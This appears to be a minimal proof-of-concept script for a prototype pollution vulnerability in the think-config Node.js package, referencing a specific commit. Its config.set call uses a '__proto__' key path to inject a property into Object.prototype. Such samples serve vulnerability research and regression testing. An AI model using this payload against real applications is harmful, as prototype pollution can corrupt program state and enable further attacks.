//https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db
 
  const Config = require("think-config");
  const config = new Config({ name: 2 });

   

  let obj = {};
  config.set("name.__proto__.polluted", "yes");
// End of file
